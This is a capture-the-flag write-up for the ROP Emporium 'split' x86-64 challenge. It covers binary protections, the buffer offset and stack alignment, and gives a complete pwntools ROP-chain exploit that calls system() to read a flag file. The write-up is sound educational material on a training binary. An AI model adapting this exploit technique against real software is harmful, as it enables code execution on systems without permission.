
# ROP Emporium – split (x86_64)

## Challenge Overview

The `split` challenge is a classic **ROP (Return-Oriented Programming)** task on x86-64.
The goal is to execute:

```

/bin/cat flag.txt

```

The binary already contains:
- a string `"/bin/cat flag.txt"`
- a `system@plt` call

NX is enabled, so shellcode injection is not possible.  
Instead, we build a ROP chain to call `system()` with the correct argument.

---

## Binary Protections

```

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary
NX:       Enabled
PIE:      No PIE

```

---

## Key Symbols

Using `readelf` / `pwndbg`:

```

usefulFunction @ 0x400742
usefulString   @ 0x601060
system@plt     @ 0x400560

```

The string stored at `usefulString`:

```

"/bin/cat flag.txt"

```

---

## Offset Calculation

The vulnerable function reads user input into a stack buffer.

Using cyclic patterns / analysis:
```

Offset to RIP = 40 bytes

````

---

## ROP Strategy

On x86-64:
- Function arguments are passed via registers
- `system(const char *cmd)` expects the argument in `RDI`

So we need:
1. `pop rdi ; ret`
2. Address of `usefulString`
3. Call to `system@plt`

---

## Stack Alignment (Important)

x86-64 System V ABI requires the stack to be **16-byte aligned before a function call**.

ROP uses `ret`, not `call`, so alignment is often broken.
If alignment is incorrect, `system()` may crash due to SSE instructions (`movaps`).

**Fix:** add an extra `ret` gadget before the ROP chain.

---

## Final Exploit

```python
from pwn import *

context.binary = exe = ELF('split')
r = process(exe.path)

rop = ROP(exe)

offset = 40
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
cmd = exe.sym['usefulString']
system = exe.sym['system']

payload = flat(
    b'A' * offset,
    rop.ret,        # stack alignment
    pop_rdi,
    cmd,
    system
)

r.sendline(payload)
r.interactive()
````

---

## Result

```
$ cat flag.txt
ROPE{...flag...}
```

---

## Takeaways

* ROP chains on x86-64 **must respect stack alignment**
* If a libc call crashes unexpectedly, **add a `ret`**
* Always verify argument registers (`RDI`, `RSI`, `RDX`, …)

---
